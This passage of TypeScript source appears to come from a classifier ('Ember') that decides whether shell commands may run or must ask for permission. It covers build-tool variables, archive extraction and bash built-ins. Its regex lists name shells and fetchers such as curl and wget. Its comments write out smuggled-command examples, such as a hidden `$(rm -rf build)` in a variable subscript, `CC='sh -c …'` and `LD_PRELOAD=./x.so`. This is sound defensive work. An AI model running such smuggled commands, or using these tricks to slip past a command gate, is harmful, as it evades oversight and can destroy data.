    const ok = prog === "git" ? /^(rev-parse|describe|symbolic-ref)$/.test(words[0] ?? "") : SAYS_LITTLE.has(prog) && !versionOnly;
    if (!ok) return false;
    // A fetch says what another computer returned only when every address is a web one: `curl file:///…`, `-K file`,
    // `--data @file` and their like read this computer's files (commands-classes-x9-5).
    if (/^(curl|wget)$/.test(prog) && !words.every(w => FETCH_ONLY.test(w.replace(/^(["'])(.*)\1$/, "$2")))) return false;
    if (prog === "date" && words.some(w => /^(-[A-Za-z]*f|--file)/.test(w))) return false;
    for (const st of stages.slice(1)) if (!Object.hasOwn(PASSES_ON, st[0]) || filterReadsFile(st) || st.slice(1).some(w => !/^(-|'|"|[A-Za-z0-9_]*$)/.test(w) && /[/.]/.test(w))) return false;
  }
  return true;
}
/** Programs whose words are, or hold, a command line they hand to a shell: judged there (nested()), never as their own files. */
const NESTS_TEXT = new Set(["sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "cmd", "powershell", "pwsh", "wsl", "watch", "flock", "script", "su", "runuser", "ssh", "slogin", "parallel", "eval", "source", "."]);
const fetches = (key: string): boolean => FETCHERS.has(key) || TEXT_FETCHERS.has(key);
/** The input a pipe gives a program, by the names it can be opened under (`install /dev/stdin a.sh`, `cp /dev/fd/0 a.sh`). */
const PIPE_INPUT = /^(\/dev\/stdin|\/dev\/fd\/0|\/proc\/self\/fd\/0)$/;

/**
 * Variables whose value is a command a build tool runs (`CC='sh -c …' make`, `PSQL_PAGER=…`): the value is judged as a
 * command, so an ordinary name (`CC=clang`) runs (commands-remote-c8-1). Wrapper variables that always name a program
 * are in RISKY_ASSIGNMENTS instead (`RUSTC_WRAPPER`, `CARGO_BUILD_RUSTC_WRAPPER`): those ask however they are set.
 */
const PROGRAM_CMD_VARS = new Set([
  "CC", "CXX", "CPP", "LD", "RUSTC", "OBJC", "OBJCXX", "HOSTCC", "HOSTCXX", "AS", "AR", "NM", "RANLIB", "STRIP",
  "PSQL_PAGER", "GH_PAGER", "AWS_PAGER", "GCLOUD_PAGER", "DELTA_PAGER", "KUBECTL_EXTERNAL_DIFF", "CLOUDSDK_PYTHON", "LUA_INIT",
]);
/** Variables holding a tool's options where a sub-option names a program it runs (`GOFLAGS=-toolexec=…`). */
const PROGRAM_OPT_VARS = /^(GOFLAGS|GOTESTFLAGS|CGO_[A-Z]*FLAGS|TAR_OPTIONS|RUSTFLAGS|CARGO_[A-Z_]*RUSTFLAGS|PYTEST_ADDOPTS)$/;
/**
 * A listed program variable's value that looks like a shell command: any operator that chains or substitutes (`|`, `;`,
 * `&&`, a substitution, a backtick, a newline — never a lone `&`, `<`, `>` or parenthesis, which a URL or a flag holds),
 * or a leading shell or interpreter with an argument after it (`sh -c …`, never a bare `python3`): commands-remote-c8-1.
 */
const SHELL_SHAPE = /[|;`\n]|&&|\$\(/;
const SHELL_WORD = String.raw`(?:sh|bash|zsh|dash|ksh|fish|ash|busybox|env|eval|exec|command|xargs|python[0-9.]*|perl|ruby|node|nodejs|php|lua|awk|sed|curl|wget)`;
const SHELL_LEAD = new RegExp(String.raw`^\s*${SHELL_WORD}\s+\S`);
/**
 * The word after a shell or interpreter when it is that program's argument, not prose: an option, a path, a file name
 * with an extension, a quoted, substituted or assigned word, or another shell word (`env sh`). So `env vars here`, `sed
 * and awk tips` and `exec bit fixed` are words, not commands (commands-remote-x8-3).
 */
const SHELL_ARG = String.raw`(?:[-./~$'"\\{(]\S*|\S*[/=$'"\\{(]\S*|\S*\.[A-Za-z]\w*|${SHELL_WORD})(?=\s|$)`;
/**
 * A value that STARTS a shell command: a shell or interpreter with an argument (SHELL_ARG) at the start or right after a
 * `|`, `;` or `&&`, or a substitution. An ordinary value that merely holds a `|` or `;` (a connection string, a colour
 * spec, a filter) is not a command, so `TEST_FILTER='unit|integration' npm test` runs (commands-remote-c8-1).
 */
const SHELL_START = new RegExp(String.raw`(?:^|[|;]|&&)\s*${SHELL_WORD}\s+${SHELL_ARG}`);
/** go's options that name a program it runs over a build or its tests, with one dash or two (go reads `--toolexec` too). */
const GO_PROGRAM_OPT = String.raw`--?(?:toolexec|exec|vettool)`;
/** A go argument that is one of them, its value attached or not (`-toolexec=/tmp/t`, `--exec`). */
const GO_PROGRAM_ARG = new RegExp(String.raw`^${GO_PROGRAM_OPT}(?:=([\s\S]*))?$`);
/**
 * Whether an options variable's value names a program its tool runs, by that tool's own sub-option (never a shared
 * list): go's, as the go row reads them; tar's, through the tar row's own option table and check, so an abbreviation
 * (`--to-com=`), `-I`, `--use-compress-program` and a checkpoint's exec count as on its command line; pytest's `-p`,
 * attached or not, unless `no:` (commands-remote-x8-4).
 */
function optNamesProgram(name: string, value: string): boolean {
  if (/^(GOFLAGS|GOTESTFLAGS|CGO_[A-Z]*FLAGS)$/.test(name)) return new RegExp(String.raw`(^|[\s,'"=])${GO_PROGRAM_OPT}(=|\s|$)`).test(value);
  if (name === "TAR_OPTIONS") {
    return /(^|[\s,'"=])--?to-command(=|\s)/.test(value) || tarRunsCommand(parseOpts(value.split(/\s+/).filter(Boolean).map(w => lit(w)), tarSpec(false)), false);
  }
  // `-C linker=…` (`-Clinker=`, `--codegen linker=`) names the program rustc links with, judged as go's `-toolexec` value
  // is: a plain linker name (`clang`, `lld`, `mold`) runs, as `CC=clang` does; a path, a command or a value Ember can't
  // see asks (commands-remote-x8-3).
  if (/RUSTFLAGS$/.test(name)) {
    for (const m of value.matchAll(/(?:^|[\s,'"=])(?:-C\s*|--codegen(?:\s+|=))linker=(\S*)/g)) if (programUnvouched(/[$`]/.test(m[1]) ? null : m[1])) return true;
    return false;
  }
  if (name === "PYTEST_ADDOPTS") return /(^|[\s,'"=])-p(=|\s+)?(?!no:)\S/.test(value);
  return false;
}
/** Whether a program an option names (go's `-toolexec`, rustc's linker) is one Ember can't vouch for: unseen, a path or a command. */
function programUnvouched(prog: string | null): boolean {
  return prog === null || namesProgram("CC", prog) || /[\\/]/.test(prog);
}
/**
 * Whether a variable set in front of a command names a program or command the command runs (commands-remote-c8-1), so
 * its value must be judged. A value Ember can't see counts only for a listed program variable, never for an ordinary
 * name (a URL or a path there wouldn't, so `DATABASE_URL=… npm test` runs). An options variable's written text is
 * judged even where part of it is out of sight, so a sub-option whose value is a variable (`GOFLAGS="-toolexec=$T"`,
 * `TAR_OPTIONS="--to-command=$T"`) asks as the written-out value does (`raw`, the word as written: commands-remote-x8-4).
 */
function namesProgram(name: string, value: string | null, raw?: string): boolean {
  if (value === null) return PROGRAM_CMD_VARS.has(name) || (raw !== undefined && PROGRAM_OPT_VARS.test(name) && optNamesProgram(name, raw.replace(/["']/g, "")));
  if (PROGRAM_OPT_VARS.test(name)) return optNamesProgram(name, value);
  // A listed compiler or pager variable holds a command, so any shell operator counts; any other name only when the
  // value plainly starts a command (a leading shell, or one after a pipe or `;`), or holds a substitution.
  if (PROGRAM_CMD_VARS.has(name)) return SHELL_SHAPE.test(value) || SHELL_LEAD.test(value);
  return SHELL_START.test(value) || /\$\(|`/.test(value);
}

/**
 * Whether a `NAME=value` word sets a variable that changes how commands are found or run, or names a command the
 * program runs: the lists the shell's own assignments and `env`'s are judged by (RISKY_ASSIGNMENTS, its prefixes,
 * PROGRAM_CMD_VARS and the options variables), for a word handed to a launcher or to a program Ember doesn't know
 * (integ2-z-2, integ2-z-3; intent.ts calls it for the user's words).
 */
export function riskyAssignment(name: string, value: string | null): boolean {
  return RISKY_ASSIGNMENTS.has(name) || RISKY_ASSIGNMENTS.has(name.toUpperCase()) || RISKY_ASSIGNMENT_PREFIX.test(name) || namesProgram(name, value);
}
/** A word that sets a variable for the command a launcher runs (`cross-env NAME=value`, `dotenv -v NAME=value`). */
const SETS_VARIABLE = /^([A-Za-z_][A-Za-z0-9_]*)=([\s\S]*)$/;
/**
 * The launchers that set variables for the command they run. None has a row (integ-y-1): each asks as a program Ember
 * doesn't know, by its bare name, from the project's own node_modules and behind a package manager alike
 * (integ2-z-1, integ2-z-3).
 */
const ENV_LAUNCHERS = new Set(["dotenv", "dotenvx", "dotenv-cli", "env-cmd", "cross-env", "cross-env-shell", "with-contenv"]);
/**
 * A launcher's words that set a variable (integ2-z-3, integ2-z-5): one that changes how commands are found or run asks
 * as `env NAME=value` does, so the user's words naming the launcher never announce it, and neither does a runner
 * that downloads it.
 */
function launcherSets(h: H): void {
  for (const a of h.args) {
    const m = SETS_VARIABLE.exec(a.v ?? a.raw);
    if (m && riskyAssignment(m[1], a.v === null ? null : m[2])) { h.e.unclear("unclear.assignment", "It changes how commands are found or run."); return; }
  }
}

/**
 * A build tool's own sources, on top of the shared PROJECT_FILE list: `go run .` and `cargo run` build a folder, so a
 * downloaded `.go`/`go.mod` or `.rs` there runs (commands-remote-r8-2). Kept per tool, never widened into PROJECT_FILE.
 */
const TOOL_PROJECT_FILES: Readonly<Record<string, RegExp>> = {
  go: /\.go$|^go\.(mod|sum)$/i,
  cargo: /\.rs$/i,
};

/** git verbs that change files in the work tree (a script there may not be what is on disk now). */
const GIT_TREE_WRITERS = new Set(["apply", "am", "checkout", "switch", "restore", "pull", "merge", "rebase", "cherry-pick", "revert", "stash", "reset", "clone", "worktree", "submodule", "read-tree", "checkout-index", "mv"]);
/** Other version control tools' verbs that change files. */
const VCS_TREE_WRITERS: Readonly<Record<string, ReadonlySet<string>>> = {
  svn: new Set(["update", "up", "checkout", "co", "export", "switch", "sw", "merge", "patch", "revert", "resolve"]),
  hg: new Set(["update", "up", "checkout", "co", "pull", "revert", "import", "unshelve", "merge", "rebase", "graft", "backout"]),
  p4: new Set(["sync", "unshelve", "revert", "integrate", "resolve", "copy", "merge", "undo", "clean", "reconcile"]),
};
/** What a read, a loop's list or the like says of text Ember can't see that it works on (commands-a7-2). */
const READ_TEXT = ["unclear.read-text", "It works on text Ember can't see."] as const;
/**
 * A POSIX word as written that is written out whole: letters, digits and the like, quoted or not, with no glob, tilde,
 * brace, variable, substitution or escape for the shell to expand (commands-a7-2).
 */
const WRITTEN_OUT = /^(?:[A-Za-z0-9_.,:/@%+=-]|'[^']*'|"[^"$`\\!]*")+$/;
/** Whether a word is written out whole (WRITTEN_OUT), as a loop's list must be for Ember to see what it sets. */
const writtenOut = (a: Arg): boolean => a.v !== null && !a.glob && WRITTEN_OUT.test(a.raw);

/**
 * Whether a program writes files Ember can't name (an archive extracted, a patch applied, a checkout, a file
 * decompressed beside itself): a script this same command then runs may not be the one on disk now (L8).
 */
export function writesUnnamedFiles(key: string, args: readonly Arg[]): boolean {
  const vs = args.map(a => a.v);
  const opt = (re: RegExp): boolean => vs.some(v => v === null || re.test(v));
  const verb = (valued: ReadonlySet<string>): string | null | undefined => {
    for (let k = 0; k < vs.length; k++) {
      const v = vs[k];
      if (v === null) return null;
      if (valued.has(v)) { k++; continue; }
      if (!v.startsWith("-")) return v;
    }
    return undefined;
  };
  switch (key) {
    case "cmake": return vs[0] === "-E" && vs[1] === "tar" && writesUnnamedFiles("tar", args.slice(2));
    case "tar": case "bsdtar": case "gtar":
      return opt(/^--(extract|get)\b|^-[A-Za-z]*x/) || /^[A-Za-wyz]*x[A-Za-z]*$/.test(vs[0] ?? "");
    case "unzip": return !opt(/^-[A-Za-z]*[lvtZp]/);
    case "7z": case "7za": case "7zr": case "unrar": case "rar": {
      const c = vs.find(v => v === null || !v.startsWith("-"));
      return c === null || /^[xe]$/i.test(c ?? "");
    }
    case "jar": return vs[0] === null || /^-?[A-Za-z]*x/.test(vs[0] ?? "") || opt(/^--extract$/);
    case "ar": {
      // The operation is the first word that isn't a long option (GNU ar takes --plugin P, --output D before it).
      for (let k = 0; k < vs.length; k++) {
        const v = vs[k];
        if (v === null) return true;
        if (v === "--plugin" || v === "--output" || v === "--target") { k++; continue; }
        if (v.startsWith("--")) continue;
        return /^-?[A-Za-z]*x/.test(v);
      }
      return false;
    }
    case "cpio": return opt(/^-[A-Za-z]*i|^--extract/);
    case "pax": return opt(/^-[A-Za-z]*r/);
    case "patch": return !vs.includes("--dry-run");
    case "gunzip": case "bunzip2": case "unxz": case "unzstd": case "unlzma": case "uncompress": case "unlz4":
      return !opt(/^-[A-Za-z]*[ctl]|^--(stdout|to-stdout|test|list)$/);
    case "gzip": case "bzip2": case "xz": case "zstd": case "lzma": case "lz4":
      return opt(/^-[A-Za-z]*d|^--(decompress|uncompress)$/) && !opt(/^-[A-Za-z]*[ctl]|^--(stdout|to-stdout|test|list)$/);
    case "git": {
      const v = verb(new Set(["-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--super-prefix", "--config-env"]));
      return v === null || (v !== undefined && GIT_TREE_WRITERS.has(v));
    }
    case "svn": case "hg": case "p4": {
      const v = verb(new Set(["-c", "-d", "-p", "-u", "-P", "-H", "-C", "-x", "-r", "-R", "--cwd", "--repository", "--config"]));
      return v === null || (v !== undefined && VCS_TREE_WRITERS[key].has(v));
    }
    default: return false;
  }
}

/**
 * Where a program that writes files Ember can't name puts them (writesUnnamedFiles), as folders: a script under one
 * counts as written by the task (L8's padding bypass). An archive unpacks into the folder it runs in and any folder its
 * options name (tar -C, unzip -d, 7z -o); tar, bsdtar, unzip and 7-Zip keep members inside it unless told to keep
 * absolute names or `..` (then: anywhere). A decompressor writes beside each file it is given. null: Ember can't tell
 * (a checkout or patch writes anywhere in its work tree; cpio and pax keep absolute names; jar and rar have options
 * Ember doesn't follow; the folder is unknown; a word Ember can't see).
 */
export function unnamedWriteFolders(key: string, args: readonly Arg[], sc: Pick<Scope, "os" | "home" | "cwd" | "path">): string[] | null {
  const cwd = sc.cwd;
  if (!cwd || args.some(a => a.v === null)) return null;
  const vs = args.map(a => a.v as string);
  const at = (p: string): string | null => (p === "" || /[*?[]/.test(p) ? null : resolveTargetPath(p, { os: sc.os, home: sc.home ?? "", cwd }));
  /** cwd and each folder `dirs` names; null when one can't be resolved. */
  const into = (dirs: string[]): string[] | null => {
    const out = [cwd];
    for (const d of dirs) { const r = at(d); if (r === null) return null; out.push(r); }
    return out;
  };
  switch (key) {
    case "cmake": return vs[0] === "-E" && vs[1] === "tar" ? unnamedWriteFolders("tar", args.slice(2), sc) : null;
    case "tar": case "bsdtar": case "gtar": {
      const dirs: string[] = [];
      for (let k = 0; k < vs.length; k++) {
        const v = vs[k];
        if (v === "-C" || v === "--directory" || v === "--cd") { if (k + 1 >= vs.length) return null; dirs.push(vs[++k]); continue; }
        if (/^--(directory|cd)=/.test(v)) { dirs.push(v.slice(v.indexOf("=") + 1)); continue; }
        // Absolute names kept, members renamed, or a bundle holding -C, -P or bsdtar's -s (a renaming pattern).
        if (/^--(absolute-names|transform|xform|substitute)/.test(v)) return null;
        if (/^-[A-Za-z]*[CPs]/.test(v) || (k === 0 && /^[A-Za-z]*[CPs][A-Za-z]*$/.test(v))) return null;
      }
      return into(dirs);
    }
    case "unzip": {
      const dirs: string[] = [];
      for (let k = 0; k < vs.length; k++) {
        const v = vs[k];
        if (v === "-d") { if (k + 1 >= vs.length) return null; dirs.push(vs[++k]); continue; }
        // `-:` lets members climb out with `..`; an attached -d is a folder too.
        if (/^-[A-Za-z^$]*:/.test(v)) return null;
        if (/^-d./.test(v)) dirs.push(v.slice(2));
      }
      return into(dirs);
    }
    case "7z": case "7za": case "7zr": {
      const dirs: string[] = [];
      for (const v of vs) {
        if (/^-spf/i.test(v)) return null; // full (absolute) paths kept
        if (/^-o./i.test(v)) dirs.push(v.slice(2));
      }
      return into(dirs);
    }
    case "ar": {
      // ar keeps a member's base name only, in the folder it runs in (P: the full name of a thin archive's member;
      // GNU ar's --output: a folder Ember doesn't follow).
      const op = vs.find((v, k) => !v.startsWith("--") && !["--plugin", "--output", "--target"].includes(vs[k - 1] ?? "")) ?? "";
      return /P/.test(op) || vs.some(v => /^--output\b/.test(v)) ? null : [cwd];
    }
    case "gunzip": case "bunzip2": case "unxz": case "unzstd": case "unlzma": case "uncompress": case "unlz4":
    case "gzip": case "bzip2": case "xz": case "zstd": case "lzma": case "lz4": {
      // Each file's folder (a pattern's too, when only its name is a pattern); none for stdin to stdout.
      const P = sc.path.flavour === "win32" ? win32 : posix;
      const files: string[] = [];
      for (let k = 0; k < vs.length; k++) {
        const v = vs[k];
        if (v === "-S" || v === "--suffix") { k++; continue; }
        // zstd's --output-dir-flat and --output-dir-mirror: a folder Ember doesn't follow.
        if (/^--output-dir/.test(v)) return null;
        if (v === "--") { files.push(...vs.slice(k + 1)); break; }
        if (!v.startsWith("-")) files.push(v);
      }
      const out: string[] = [];
      for (const f of files) {
        const dir = at(P.dirname(f));
        if (dir === null) return null;
        if (!out.includes(dir)) out.push(dir);
      }
      return out;
    }
    default:
      return null;
  }
}

/** bash built-ins that take a variable's name (a subscript in it is evaluated as arithmetic). */
const NAME_TAKERS = new Set(["printf", "read", "unset", "test", "[", "mapfile", "readarray", "declare", "typeset", "local", "export", "readonly", "wait", "getopts", "let", "eval"]);
/** The declaration built-ins: an operand is a name or a `name=value` assignment. */
const DECLARERS = new Set(["declare", "typeset", "local", "export", "readonly"]);
/** `test`'s operators whose operand is a variable's name. */
const TEST_NAME_OPS = new Set(["-v", "-R"]);
/** Options of read and mapfile whose value is text or a number, never a name (read -a's value is a name). */
const READ_TEXT_OPTS = "dinNptu";
const MAPFILE_TEXT_OPTS = "dnOsucC";

/**
 * Whether an unresolved word could become several words when the shell runs it: an unquoted expansion splits on
 * spaces, and `"$@"` or `"${a[@]}"` give one word per element even in quotes. Such a word could carry an option and
 * a name at once (`x='-v a[$(…)]'; [ $x ]`).
 */
export function mayBecomeWords(raw: string): boolean {
  let q: "'" | "\"" | null = null;
  for (let k = 0; k < raw.length; k++) {
    const c = raw[k];
    if (q === "'") { if (c === "'") q = null; continue; }
    if (c === "\\") { k++; continue; }
    if (q === "\"" && c === "\"") { q = null; continue; }
    if (q === null && (c === "'" || c === "\"")) { q = c; continue; }
    if (c === "`" && q === null) return true;
    if (c !== "$") continue;
    const n = raw[k + 1] ?? "";
    if (n === "@" || (n === "{" && /^\{[^}]*@/.test(raw.slice(k + 1)))) return true;
    if (q === null && /[A-Za-z0-9_{(*#?$!-]/.test(n)) return true;
  }
  return false;
}

/**
 * Whether a built-in sets, by its name, a variable that changes how commands are found or run (RISKY_ASSIGNMENTS):
 * printf's `-v` name (`printf -v PATH /tmp/x`, `-vPATH`, `PATH[0]`), and any word of read, mapfile, readarray,
 * getopts, wait or unset that is such a name (`read PWD <<< /z/l` makes a later `bash -c 'cd ..'` leave from /z/l;
 * after `unset PWD` it leaves from the folder's real path).
 */
function setsRiskyName(key: string, args: readonly Arg[]): boolean {
  const risky = (n: string | null | undefined): boolean => {
    if (typeof n !== "string") return false;
    const name = n.replace(/\[.*$/, "");
    return RISKY_ASSIGNMENTS.has(name) || RISKY_ASSIGNMENT_PREFIX.test(name);
  };
  if (key === "printf") {
    for (let k = 0; k < args.length; k++) {
      const v = args[k].v;
      if (v === null || v === "--" || v === "-" || !v.startsWith("-")) return false;
      if (v === "-v") return risky(args[k + 1]?.v);
      if (v.startsWith("-v")) return risky(v.slice(2));
    }
    return false;
  }
  return ["read", "mapfile", "readarray", "getopts", "wait", "unset"].includes(key) && args.some(a => risky(a.v));
}

/** The keywords that open an `if` or a loop, and the word that closes each. */
const COMPOUND_CLOSER: Readonly<Record<string, string>> = { if: "fi", while: "done", until: "done", for: "done" };
/** The keywords the classifier unwraps a command from (`then rm x`): they stay in the text's own shell. */
export const FLOW_WRAPPER: ReadonlySet<string> = new Set(["if", "then", "elif", "else", "while", "until", "do", "!"]);
/**
 * The reserved words after which bash and zsh still read `NAME=value` words as assignments (`then LD_PRELOAD=./x.so
 * ls`, `time PATH=/tmp/x ls`), unlike a program that runs the next word (`command`, `nice`, `nohup`).
 */
const ASSIGNS_AFTER: ReadonlySet<string> = new Set([...FLOW_WRAPPER, "time"]);
/** The built-ins that read lines and run nothing: a variable set in front of one lasts only while it reads. */
const READS_LINES: ReadonlySet<string> = new Set(["read", "mapfile", "readarray"]);
/** The flow words a command may stand after in a loop or an `if` (`while IFS= read -r l`, `do read -r l`). */
const LOOP_OR_IF: ReadonlySet<string> = new Set(["if", "then", "elif", "else", "while", "until", "do"]);
/**
 * Built-ins that change what the rest of the line runs with: its folder (cd and friends), its options or positional
 * words (set, shift), its variables (unset), or anything a sourced file or exec does (commands-b7-1, b7-3).
 */
const SHELL_STATE: ReadonlySet<string> = new Set(["cd", "chdir", "pushd", "popd", "set", "unset", "shift", "source", ".", "exec"]);
/**
 * Whether a POSIX command changes the shell's state for what follows it (holdsFlow): a SHELL_STATE built-in, one run
 * through exec, `wait -p` (a variable), or a `{name}` word (`exec {fd}< f` sets fd).
 */
function changesShellState(c: ParsedCommand): boolean {
  if (c.family !== "posix") return false;
  return SHELL_STATE.has(c.program) || c.wrappers.includes("exec") || [c.program, ...c.args].some(a => a !== null && /^\{[A-Za-z_]\w*\}$/.test(a))
    || (c.program === "wait" && c.args.some(a => a === null || /^-\w*p/.test(a)));
}
/** An unquoted `NAME=value` or `NAME+=value` word, as the parser takes one at the start of a command. */
const ASSIGNMENT_WORD = /^([A-Za-z_][A-Za-z0-9_]*)\+?=/;

/**
 * The `read` commands (by index) whose `if` or loop takes its input from a file or text (`while read -r l; do …; done
 * < list.txt`, `done <<< "$x"`; `given` says which commands were given one): they read that, not the user's typing
 * (commands-remote-2). Only the command line's own POSIX text is followed (a command a nested shell or a wrapper runs
 * counts as not fed), and anything it can't pair up (case, a group, a function, a closer without its opener) leaves
 * every read as it was.
 */
export function readsFedByCompound(commands: readonly ParsedCommand[], given: (i: number) => boolean): Set<number> {
  return new Set(fedReadsByCloser(commands, given).keys());
}

/** readsFedByCompound's reads, each with the index of the closer (`done`, `fi`) that gives it its input. */
function fedReadsByCloser(commands: readonly ParsedCommand[], given: (i: number) => boolean): Map<number, number> {
  const none = new Map<number, number>();
  const fed = new Map<number, number>();
  const open: { closer: string; reads: number[] }[] = [];
  for (let i = 0; i < commands.length; i++) {
    const c = commands[i];
    if (c.family !== "posix" || !c.wrappers.every(w => FLOW_WRAPPER.has(w))) continue;
    if (["case", "esac", "select", "{", "}", "function", "coproc"].includes(c.program)) return none;
    for (const w of [...c.wrappers, c.program]) if (Object.hasOwn(COMPOUND_CLOSER, w)) open.push({ closer: COMPOUND_CLOSER[w], reads: [] });
    if (READS_LINES.has(c.program) && c.pipedFrom === undefined && open.length) open[open.length - 1].reads.push(i);
    if (c.program !== "fi" && c.program !== "done") continue;
    const top = open.pop();
    if (!top || top.closer !== c.program) return none;
    if (given(i)) for (const r of top.reads) fed.set(r, i);
    else if (open.length) open[open.length - 1].reads.push(...top.reads);
  }
  return fed;
}

/**
 * Whether a name-taking built-in gets a variable's name Ember can't see (D4.3 g). bash evaluates the subscript of a
 * name it is given (`printf -v`, `read`, `declare` with a value, `test -v`, `unset` of an array element), so
 * `x='a[$(rm -rf build)]'; printf -v "$x" y` runs the hidden command. Every place a name can stand counts, and so
 * does an unresolved word that could itself be the option taking a name (`printf "$o" "$x" y`) or split into an
 * option and a name (`[ $x ]`). Written-out names are judged by their text (`a[$(…)]`) elsewhere.
 */
export function unseenName(key: string, args: readonly Arg[]): boolean {
  const unres = (a: Arg | undefined): boolean => a !== undefined && a.v === null;
  /**
   * Walks the options: letters in `textOpts` take a text or number value, letters in `nameOpts` a name. Returns where
   * the operands start (an unresolved word stops the walk: it could be an option too), or -1 for a name Ember can't
   * see (or a text value that could split into one).
   */
  const options = (textOpts: string, nameOpts: string): number => {
    let k = 0;
    for (; k < args.length; k++) {
      const v = args[k].v;
      if (v === null || v === "--" || !v.startsWith("-") || v === "-") return v === "--" ? k + 1 : k;
      for (let j = 1; j < v.length; j++) {
        const c = v[j];
        if (!textOpts.includes(c) && !nameOpts.includes(c)) continue;
        if (j === v.length - 1) {
          const value = args[k + 1];
          if (nameOpts.includes(c) ? unres(value) : unres(value) && mayBecomeWords(value!.raw)) return -1;
          k++;
        }
        break;
      }
    }
    return k;
  };
  switch (key) {
    case "printf": {
      // printf [-v name] [--] format [arguments]: an unresolved format could be -v itself, or split into -v and a name.
      const at = options("", "v");
      return at < 0 || (unres(args[at]) && (at < args.length - 1 || mayBecomeWords(args[at].raw)));
    }
    case "test":
    case "[": {
      const ops = key === "[" && args.at(-1)?.v === "]" ? args.slice(0, -1) : args;
      return ops.some((a, k) => unres(a) && (mayBecomeWords(a.raw) || TEST_NAME_OPS.has(ops[k - 1]?.v ?? "") || unres(ops[k + 1])));
    }
    case "read":
    case "mapfile":
    case "readarray": {
      const at = options(key === "read" ? READ_TEXT_OPTS : MAPFILE_TEXT_OPTS, key === "read" ? "a" : "");
      return at < 0 || args.slice(at).some(unres);
    }
    case "getopts":
      return unres(args[1]) || (unres(args[0]) && mayBecomeWords(args[0].raw));
    case "unset":
    case "wait":
      return args.some(unres);
    default: {
      if (!DECLARERS.has(key)) return false;
      // An array declaration reads a value as a compound assignment whose subscripts run (`declare -a a="$v"` with
      // v='([$(…)]=1)'): any value Ember can't see counts. Otherwise an assignment whose name is written out is fine
      // whatever its value.
      const array = args.some(a => a.v !== null && /^-[A-Za-z]*[aA]/.test(a.v));
      return args.some(a => unres(a) && (array || !/^["']?[A-Za-z_][A-Za-z0-9_]*\+?=/.test(a.raw)));
    }
  }
}

/** Words that name the null device or the terminal (redirecting to them writes no file). */
const NULL_SINKS = new Set(["/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty", "nul", "$null", "con", "nul:"]);

/**
 * Extra scope fields (kept off Scope so copies stay cheap). `captured`: what the scope's last command prints is taken by
 * a substitution or a later command of a pipeline (commands-remote-w5-4).
 */
interface ScopeMore { pipedIn: { fetch: boolean } | null; captured?: true }
const MORE = new WeakMap<Scope, ScopeMore>();
const more = (sc: Scope): ScopeMore => MORE.get(sc) ?? { pipedIn: null };

/** A copy of a scope for a nested part (a subshell's `cd` doesn't leak). */
function child(sc: Scope, o: Partial<Scope> = {}, m?: ScopeMore): Scope {
  const next: Scope = { ...sc, ...o };
  MORE.set(next, m ?? { pipedIn: null });
  return next;
}

class Engine extends Classifier {
  /** The folder a `cd` just set (undefined: the command wasn't a cd). */
  cdTarget: string | null | undefined = undefined;
  /**
   * How many of `downloads` stood when the last command run inside another one (a runner's or a wrapper's payload,
   * `poetry run git clone …`) ended: those marks are the inner command's, so the outer one's runner check still reads
   * them, as on main (commands-remote-x8-2). Only the marks a command's own row made are for later commands.
   */
  private innerMarks = 0;

  /**
   * asksApart for a whole command judged a second way: the commands it registers, and where it leaves the pipeline, the
   * current command and the folder, are taken back too, so the command proper is judged as if this never ran.
   */
  asksApartWhole(judge: () => void, apartFrom?: RegExp): boolean {
    return this.foundApartWhole(judge, apartFrom).length > 0;
  }

  /**
   * asksApartWhole's findings themselves, for heldTo. `row`: the judging is a row's, of the command that is current, read
   * another way (runRow): what a wrapper's unwrap made of that command (its program, arguments and wrappers) is
   * taken back as well, and so are the words it marked as judged or handed on and everything it left behind by a
   * command's index, the current command's included (readApart).
   */
  foundApartWhole(judge: () => void, apartFrom?: RegExp, row = false): Finding[] {
    const n = this.commands.length;
    const kept = { count: this.simpleCount, at: this.at, program: this.program, pipe: this.pipe, state: { ...this.pipe }, cd: this.cdTarget, top: this.topCd };
    const pc = row ? this.commands[this.at] : undefined;
    const own = pc ? { program: pc.program, args: pc.args, wrappers: pc.wrappers } : undefined;
    const back = row ? this.readApart() : undefined;
    try {
      return this.foundApart(judge, apartFrom);
    } finally {
      if (pc && own) Object.assign(pc, own);
      back?.();
      this.commands.length = n;
      this.simpleCount = kept.count;
      this.at = kept.at;
      this.program = kept.program;
      this.pipe = kept.pipe;
      this.pipe.fetch = kept.state.fetch;
      this.pipe.program = kept.state.program;
      if (kept.state.carried === undefined) delete this.pipe.carried; else this.pipe.carried = kept.state.carried;
      this.cdTarget = kept.cd;
      this.topCd = kept.top;
    }
  }
  /** The single top-level cd, for cdOnly. */
  topCd: { at: number; abs: string | null } | null = null;

  /** A row is being judged by main's option tables (runRow): every table it and the commands it runs read is main's. */
  private asMain = false;
  /** A table the row being judged read differs from main's on this line (parseHeld). */
  private tablesDiffer = false;
  /** A held row's two readings leave the shell in different folders somewhere on this line (runRow). */
  private foldersDiffer = false;
  /** The line is being judged again with the folder main's reading of each such row leaves (heldToMainFolders). */
  private mainFolders = false;
  /** An && chain on this line moved the folder, and what follows its end may run where it started (chainEnds). */
  private chainMoved = false;
  /** The line is being judged again with the folder unknown after each such chain (heldToChainFolders). */
  private chainUnknown = false;

  /**
   * Whether the row is being judged main's way (runRow). A check the row has learned since, which main's row at 4d64d3a
   * didn't make, is left out of that reading, so it holds a command only to what main asked (`docker run -P nginx` ran
   * there: commands-held-8).
   */
  get readsAsMain(): boolean {
    return this.asMain;
  }

  /**
   * A line's options by a row's table (`now`), or by main's (`was`) while the row is judged main's way; where the two
   * read the line differently (another option takes a value, so other words are the operands), runRow is told.
   * `wasArgs`: the words as main's row parsed them, where the row rewrites some first (Maven's `-gs`).
   */
  parseHeld(args: readonly Arg[], now: OptSpec, was: OptSpec, wasArgs: readonly Arg[] = args): Parsed {
    const p = parseOpts(args, now);
    const m = parseOpts(wasArgs, was);
    if (this.asMain) return m;
    if (!sameParse(p, m)) this.tablesDiffer = true;
    return p;
  }

  /** The table parseHeld reads by now, for a row that parses more words by it (a variable's value split into options). */
  tableInUse(now: OptSpec, was: OptSpec): OptSpec {
    return this.asMain ? was : now;
  }

  /**
   * Judges a program's row, held to main's option tables (commands-held): when a table the row read (heldOpts) reads this
   * line differently from the table main had at 4d64d3a, the row is judged again main's way, apart. Main's refusal
   * stands (the row's own, in its own words, when it has one; otherwise said as what Ember can't tell: heldRefusal),
   * and unless everything main's reading found the row's own found too, the command asks and the dangers main named
